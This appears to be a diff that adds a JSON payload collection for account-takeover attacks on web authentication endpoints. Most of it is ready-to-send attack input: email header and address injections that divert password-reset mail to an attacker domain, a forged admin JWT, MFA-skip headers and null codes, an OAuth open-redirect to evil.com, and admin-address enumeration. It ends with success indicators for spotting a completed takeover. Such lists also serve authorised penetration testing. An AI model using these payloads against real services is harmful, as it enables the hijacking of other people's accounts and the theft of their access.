@@ -1,0 +1,118 @@
+{
+  "info": {
+    "name": "Account Takeover Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Account takeover attack vectors including password reset flaws, token prediction, email manipulation, and authentication bypass. 2026 updated.",
+    "category": "Business Logic",
+    "severity": "CRITICAL",
+    "owasp": "A07:2021 - Identification and Authentication Failures"
+  },
+  "attack_vectors": {
+    "password_reset_token": [
+      {"payload": "token=null", "description": "Null token test", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "token=admin", "description": "String token test", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "token=123456", "description": "Numeric token test", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "token=", "description": "Empty token test", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "token[]=", "description": "Array token test", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", "description": "Forged admin JWT", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "user_id=1", "description": "User ID manipulation", "endpoint": "/api/reset-password", "method": "POST"},
+      {"payload": "email=admin@victim.com&token=", "description": "Email + empty token", "endpoint": "/api/reset-password", "method": "POST"}
+    ],
+    "email_manipulation": [
+      {"payload": "email=victim@email.com%0a%0dBcc:attacker@evil.com", "description": "Email header injection", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=victim@email.com,attacker@evil.com", "description": "Email comma injection", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=victim@email.com attacker@evil.com", "description": "Email space injection", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=\"victim@email.com\" <attacker@evil.com>", "description": "Email quoted injection", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=victim@email.com%00@evil.com", "description": "Null byte email injection", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=%22victim@email.com%22@evil.com", "description": "Quoted email bypass", "endpoint": "/api/forgot-password", "method": "POST"}
+    ],
+    "token_prediction": [
+      {"test": "Request reset for same email twice", "description": "Check if tokens are sequential"},
+      {"test": "Request reset for different emails at same time", "description": "Check token uniqueness"},
+      {"test": "Compare token length", "description": "Check token entropy"},
+      {"test": "Use same token twice", "description": "Check token reuse prevention"},
+      {"test": "Use expired token", "description": "Check token expiration"}
+    ],
+    "token_not_invalidated": [
+      {"payload": "new_password=NewPass123!", "description": "Reset password without old", "endpoint": "/api/change-password", "method": "POST"},
+      {"payload": "new_password=NewPass123!&old_password=", "description": "Empty old password", "endpoint": "/api/change-password", "method": "POST"},
+      {"test": "Use old password after reset", "description": "Check if old password still works"},
+      {"test": "Use reset token multiple times", "description": "Check token single use"}
+    ],
+    "password_strength": [
+      {"payload": "password=123456", "description": "Numeric password", "endpoint": "/api/register", "method": "POST"},
+      {"payload": "password=password", "description": "Common password", "endpoint": "/api/register", "method": "POST"},
+      {"payload": "password=admin", "description": "Admin password", "endpoint": "/api/register", "method": "POST"},
+      {"payload": "password=q", "description": "Single character", "endpoint": "/api/register", "method": "POST"},
+      {"payload": "password=", "description": "Empty password", "endpoint": "/api/register", "method": "POST"},
+      {"payload": "password=%00", "description": "Null byte password", "endpoint": "/api/register", "method": "POST"}
+    ],
+    "mfa_bypass": [
+      {"payload": "X-Skip-MFA: true", "description": "MFA skip header", "endpoint": "/api/me", "method": "GET"},
+      {"payload": "X-2FA-Bypass: 1", "description": "2FA bypass header", "endpoint": "/api/me", "method": "GET"},
+      {"payload": "X-MFA-Token: 000000", "description": "Universal MFA code", "endpoint": "/api/verify-mfa", "method": "POST"},
+      {"payload": "X-MFA-Token: 123456", "description": "Common MFA code", "endpoint": "/api/verify-mfa", "method": "POST"},
+      {"payload": "mfa_code=null", "description": "Null MFA code", "endpoint": "/api/verify-mfa", "method": "POST"},
+      {"payload": "mfa_code=", "description": "Empty MFA code", "endpoint": "/api/verify-mfa", "method": "POST"},
+      {"test": "Request MFA code, don't use it", "description": "Check if MFA required"},
+      {"test": "Use very long MFA code", "description": "Check MFA validation strictness"}
+    ],
+    "session_hijacking": [
+      {"test": "Intercept session cookie", "description": "Check cookie security flags"},
+      {"test": "Use expired session", "description": "Check session expiration"},
+      {"test": "Reuse old session ID", "description": "Check session regeneration"},
+      {"test": "Brute force session ID", "description": "Check session ID entropy"}
+    ],
+    "oauth_misconfiguration": [
+      {"payload": "redirect_uri=https://legitimate.com..//evil.com", "description": "Open redirect in OAuth", "endpoint": "/oauth/authorize", "method": "GET"},
+      {"payload": "redirect_uri=null", "description": "Null redirect URI", "endpoint": "/oauth/authorize", "method": "GET"},
+      {"payload": "state=", "description": "Empty state parameter", "endpoint": "/oauth/authorize", "method": "GET"},
+      {"payload": "scope=openid profile email", "description": "Scope escalation", "endpoint": "/oauth/authorize", "method": "GET"},
+      {"test": "Reuse authorization code", "description": "Check code reuse prevention"},
+      {"test": "Use code for different client", "description": "Check client_id validation"}
+    ],
+    "social_engineering_vectors": [
+      {"payload": "email=admin@victim.com", "description": "Admin email enumeration", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=support@victim.com", "description": "Support email enumeration", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=webmaster@victim.com", "description": "Webmaster enumeration", "endpoint": "/api/forgot-password", "method": "POST"},
+      {"payload": "email=postmaster@victim.com", "description": "Postmaster enumeration", "endpoint": "/api/forgot-password", "method": "POST"}
+    ]
+  },
+  "endpoints": [
+    "/api/forgot-password",
+    "/api/reset-password",
+    "/api/change-password",
+    "/api/login",
+    "/api/register",
+    "/api/logout",
+    "/api/verify-email",
+    "/api/verify-mfa",
+    "/api/sessions",
+    "/api/me",
+    "/oauth/authorize",
+    "/oauth/token",
+    "/auth/reset-password",
+    "/auth/forgot-password"
+  ],
+  "detection_patterns": [
+    "token",
+    "reset",
+    "password",
+    "mfa",
+    "otp",
+    "code",
+    "verification",
+    "session",
+    "authenticate"
+  ],
+  "successful_indicators": [
+    "Token is valid",
+    "Password changed successfully",
+    "Login successful",
+    "Reset link sent",
+    "MFA verified",
+    "Session created",
+    "Access granted"
+  ]
+}
